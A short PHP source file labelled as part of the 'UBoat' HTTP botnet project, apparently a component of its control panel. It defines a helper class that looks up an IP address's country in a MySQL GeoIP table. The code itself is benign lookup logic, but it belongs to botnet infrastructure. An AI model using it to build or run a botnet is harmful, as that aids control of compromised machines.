<?php

/**
 * This file is part of UBoat - HTTP Botnet Project
 */

class geoip_helper
{
    private $pdo = null;

    public function __construct()
    {
        $this->pdo = new \PDO('mysql:host='.goat::$app->config['db']['host'].';dbname='.goat::$app->config['db']['dbname'], goat::$app->config['db']['username'], goat::$app->config['db']['password']);
    }

    //no longer static
    public function GetCountryFromAddress($address)
    {
        $p = [];
        $p[':addy'] = (int) ip2long($address);
        $query = $this->pdo->prepare('SELECT n.country_name, n.country_code FROM ip_country c INNER JOIN country_names n ON c.country_code = n.country_code WHERE :addy BETWEEN c.ip_start_long AND c.ip_end_long LIMIT 1');
        $query->execute($p);
        $data = $query->fetch();

        return empty($data) ? ['country_code' => '00', 'country_name' => 'Unknown'] : $data;
    }
}
